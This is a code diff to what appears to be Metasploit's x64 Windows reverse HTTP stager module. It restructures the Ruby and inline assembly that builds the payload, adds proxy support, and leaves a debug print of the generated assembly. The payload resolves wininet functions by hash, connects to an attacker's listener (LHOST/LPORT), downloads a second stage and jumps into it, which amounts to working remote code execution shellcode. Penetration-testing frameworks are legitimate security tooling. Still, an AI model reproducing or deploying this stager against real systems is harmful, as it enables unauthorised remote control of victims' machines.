@@ -46,31 +46,23 @@ module Payload::Windows::ReverseHttp_x64
   # Generate the first stage
   #
   def generate(opts={})
-    ssl = opts[:ssl] || false
-
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_http({
-        :ssl         => ssl,
-        :host        => datastore['LHOST'],
-        :port        => datastore['LPORT'],
-        :url         => generate_small_uri,
-        :retry_count => datastore['StagerRetryCount']})
-    end
-
     conf = {
-      :ssl         => ssl,
+      :ssl         => opts[:ssl] || false,
       :host        => datastore['LHOST'],
       :port        => datastore['LPORT'],
-      :url         => generate_uri,
-      :exitfunk    => datastore['EXITFUNC'],
-      :proxy_host  => datastore['PayloadProxyHost'],
-      :proxy_port  => datastore['PayloadProxyPort'],
-      :proxy_user  => datastore['PayloadProxyUser'],
-      :proxy_pass  => datastore['PayloadProxyPass'],
-      :proxy_type  => datastore['PayloadProxyType'],
+      :url         => generate_small_uri,
       :retry_count => datastore['StagerRetryCount']
     }
+
+    # add extended options if we do have enough space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk]   = datastore['EXITFUNC']
+      conf[:proxy_host] = datastore['PayloadProxyHost']
+      conf[:proxy_port] = datastore['PayloadProxyPort']
+      conf[:proxy_user] = datastore['PayloadProxyUser']
+      conf[:proxy_pass] = datastore['PayloadProxyPass']
+      conf[:proxy_type] = datastore['PayloadProxyType']
+    end
 
     generate_reverse_http(conf)
   end
@@ -215,18 +207,39 @@ module Payload::Windows::ReverseHttp_x64
         call rbp
 
       internetopen:
+    ^
+
+    if proxy_enabled
+      asm << %Q^
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+        pop r8                        ; stack pointer (lpszProxyName)
+        push 3                        ; INTERNET_OPEN_TYPE_PROXY = 3 (dwAccessType)
+        pop rdx
+      ^
+    else
+      asm << %Q^
+        xor r8, r8                    ; NULL pointer (lpszProxyName)
+        xor rdx, rdx                  ; PRECONFIG = 0 (dwAccessType)
+      ^
+    end
+
+    asm << %Q^
         push 0                        ; alignment
         push 0                        ; NULL pointer
-        mov rcx, rsp                  ; Empty string pointer (lpszAgent)
-        xor rdx, rdx                  ; PRECONFIG = 0 (dwAccessType)
-        xor r8, r8                    ; NULL pointer (lpszProxyName)
         xor r9, r9                    ; NULL pointer (lpszProxyBypass)
+        mov rcx, rsp                  ; Empty string pointer (lpszAgent)
         push 0                        ; 0 (dwFlags)
         push 0                        ; alignment
         mov r10, 0xA779563A           ; hash( "wininet.dll", "InternetOpenA" )
         call rbp
+    ^
 
-        jmp dbl_get_server_host
+    asm << %Q^
+        call internetconnect
+      get_server_host:
+        db "#{opts[:host]}", 0x00
 
       internetconnect:
         pop rdx                       ; String (lpszServerName)
@@ -240,12 +253,14 @@ module Payload::Windows::ReverseHttp_x64
         mov r10, 0xC69F8957           ; hash( "wininet.dll", "InternetConnectA" )
         call rbp
 
-        jmp get_server_uri
+        call httpopenrequest
+      get_server_uri:
+        db "#{opts[:url]}",0x00
 
       httpopenrequest:
+        pop r8                        ; String (lpszObjectName)
         mov rcx, rax                  ; HINTERNET (hConnect)
         xor rdx, rdx                  ; NULL pointer (lpszVerb)
-        pop r8                        ; String (lpszObjectName)
         xor r9, r9                    ; String (lpszVersion)
         push 0                        ; 0 (dwContext)
         ; TODO: figure out what's going on here (get help from HD?)
@@ -267,11 +282,13 @@ module Payload::Windows::ReverseHttp_x64
 
       retry:
       ^
+
     if opts[:ssl]
       asm << %Q^
-      internetsetoption:
+      internetsetoption_ssl:
         mov rcx, rsi                  ; (hInternet)
-        mov rdx, 31                   ; INTERNET_OPTION_SECURITY_FLAGS
+        push 31                       ; INTERNET_OPTION_SECURITY_FLAGS
+        pop rdx
         push 0                        ; alignment
         push #{set_option_flags}      ; (dwFlags)
         mov r8, rsp
@@ -299,15 +316,6 @@ module Payload::Windows::ReverseHttp_x64
         dec rdi
         jz failure
         jmp retry
-
-      dbl_get_server_host:
-        jmp get_server_host
-
-      get_server_uri:
-        call httpopenrequest
-
-      server_uri:
-        db "#{opts[:url]}",0x00
     ^
 
     if opts[:exitfunk]
@@ -360,18 +368,13 @@ module Payload::Windows::ReverseHttp_x64
 
       execute_stage:
         ret                         ; dive into the stored stage address
-
-      get_server_host:
-        call internetconnect
-
-      server_host:
-        db "#{opts[:host]}", 0x00
     ^
 
     if opts[:exitfunk]
       asm << asm_exitfunk(opts)
     end
 
+    STDERR.puts(asm)
     asm
   end
 
